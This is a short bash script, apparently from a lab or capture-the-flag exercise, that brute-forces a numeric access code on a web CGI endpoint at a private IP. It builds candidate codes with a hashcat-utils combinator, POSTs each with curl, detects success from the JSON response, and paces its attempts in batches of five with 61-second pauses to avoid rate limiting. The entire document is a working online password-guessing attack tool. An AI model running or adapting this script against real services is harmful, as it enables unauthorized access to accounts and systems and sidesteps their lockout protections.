#!/usr/bin/env bash
#Name: bruteforce.sh

IP=10.64.141.29
PORT=8080
SCRIPT=cgi-bin/psych_check.sh
TARGET=http://$IP:$PORT/$SCRIPT

BATCH_SIZE=5
WAIT_TIME=61
QUERY="code="
FAIL_STRING='"ok":false'

DICT1="nums.txt"
DICT2="nums.txt"
DICT3="blank.txt"
GEN_FILE="pass.txt"
GENERATOR=/opt/hashcat-utils/src/combinator3.bin
GEN_CMD="$GENERATOR $DICT1 $DICT2 $DICT3"

$GEN_CMD > $GEN_FILE

POSSIBLE="$(wc -l $GEN_FILE | cut -d\  -f1)"
RUNTIME="$(echo $POSSIBLE | xargs -I@ echo @ '*' $WAIT_TIME / $BATCH_SIZE / 3600.0 | bc -l)"
printf "Testing %d passwords. ETA: approximately %.2f hours\n\n" $POSSIBLE $RUNTIME


i=0;
for candidate in $(cat $GEN_FILE); do
    printf "Trying %15s...  " $candidate;
    RESPONSE="$(curl -s -X POST -d "$QUERY$candidate" $TARGET)";
    echo $RESPONSE
    if ! echo $RESPONSE | grep -q "$FAIL_STRING"; then
	    echo "SUCCESS!"
	    break;
    fi
    i=$((i+1)); 
    if (( i % BATCH_SIZE == 0 )); then
        echo -e "\nAttempted $i passwords...\n";
        sleep $WAIT_TIME;
    fi;
done | tee log.txt

